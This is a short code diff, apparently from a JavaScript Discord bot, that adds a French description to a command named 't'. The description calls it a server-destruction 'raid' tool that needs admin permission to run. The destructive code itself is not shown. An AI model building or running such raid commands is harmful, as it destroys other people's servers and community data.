@@ -5,6 +5,7 @@ const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
 
 module.exports = {
     name: 't',
+    description: 'destruction de server un pure raide mais besoin de perme admin pour etre executer ',
     async execute(message, args) {
         try {
             
